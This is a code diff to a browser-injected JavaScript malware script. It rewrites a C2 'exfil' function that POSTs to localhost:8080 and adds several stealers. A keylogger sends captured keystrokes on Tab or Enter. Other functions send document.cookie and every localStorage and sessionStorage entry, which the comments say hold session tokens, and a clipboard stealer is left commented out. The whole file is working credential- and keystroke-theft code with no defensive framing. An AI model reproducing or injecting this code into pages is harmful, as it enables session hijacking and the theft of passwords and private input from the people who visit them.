@@ -1,9 +1,16 @@
-// Send data to C2. Takes in String / json object?
-function sendc2(data) {
-    var params = JSON.stringify({ secret: data });
-    req = new XMLHttpRequest();
-    req.open("POST", "http://localhost:8080/");
-    req.send(data);
+// Send data to C2. Should take in json object.
+function exfil(data) {
+    fetch("http://localhost:8080/", {
+    //fetch("https://localhost:8080/", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+        },
+        // data should be json.
+        body: data,
+    })
 }
 
 
@@ -14,11 +21,16 @@ function keyLogger() {
     document.addEventListener('keydown', function(event) {
         if (event.code == "Tab" || event.code == "Enter") {
             pageBuf.push(tmpStr);
-            sendc2(pageBuf);
-            pageBuf = [];
-            tmpStr = "";
+            // Don't send if pageBuf is empty.
+            if (pageBuf.length > 1 || tmpStr != '') {
+                exfil(JSON.stringify({"keystrokes": pageBuf}));
+                pageBuf = [];
+                tmpStr = "";
+            }
         } else if (event.code == "Shift" || event.code == "Alt" || event.code == "Control") {
             // Ignore characters
+        } else if (event.code == "Backspace") {
+            // TODO Remove previous key if any.
         } else {
             tmpStr += event.key;
         }
@@ -26,21 +38,48 @@ function keyLogger() {
 }
 
 // Steal cookies.
-function cookieStealer() {
+function getCookies() {
     // TODO: Fix formatting to array.
-    sendc2(document.cookie);
+    exfil(JSON.stringify({"Cookies": document.cookie}));
 }
 
-// Iterate through all items in local storage.
-function localStorageStealer() {
+// Get all local storage entries and exfil them
+// Local storage can store session tokens.
+function getLocalStorage() {
     if (localStorage.length == 0) {
         return;
     }
-    for (var i = 0; i < localStorage.length; ++i ) {
-        sendc2(localStorage.getItem(localStorage.key(i)));
-      }
+    var storedItems = []
+    for (var i = 0; i < localStorage.length; ++i) {
+        storedItems.push(localStorage.getItem(localStorage.key(i)));
+    }
+    exfil(JSON.stringify({"Local_storage": storedItems}))
 }
 
-cookieStealer();
+// Get all session storage objects and exfil them
+// Session storage can be used to store session tokens.
+function getSessionStorage() {
+    if (sessionStorage.length == 0) {
+        return;
+    }
+    var sessions = [];
+    for (var i = 0; i < sessionStorage.length; ++i) {
+        sessions.push(sessionStorage.getItem(sessionStorage.key(i)));
+    }
+    exfil(JSON.stringify({"Session_storage": sessions}))
+}
+
+/* The clipboard API is quite heavily restricted on modern browsers.
+* Wonder why...
+function stealClipboard() {
+    navigator.clipboard.readText()
+    .then(text => {
+      console.log('Pasted content: ', text);
+    })
+}
+*/ 
+
+getCookies();
+getLocalStorage();
+getSessionStorage();
 keyLogger();
-localStorageStealer();
